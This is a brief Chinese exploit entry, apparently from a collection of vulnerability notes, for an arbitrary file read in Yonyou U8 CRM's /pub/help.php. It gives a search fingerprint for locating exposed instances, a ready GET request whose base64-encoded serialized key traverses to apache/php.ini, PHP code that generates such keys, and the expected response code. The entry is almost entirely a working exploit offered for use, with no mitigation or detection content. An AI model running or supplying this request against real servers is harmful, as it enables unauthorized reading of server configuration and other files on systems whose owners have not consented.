# 用友crm客户关系管理help.php存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="用友 U8CRM"`
- **请求**：`GET /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9 HTTP/1.1`

**Payload**
```
编码内容
<?php
$arr = array(
"/../../../apache/php.ini",
"1",
"2"
);
$key = base64_encode(serialize($arr));
echo $key;
?>
```
- **响应特征**：200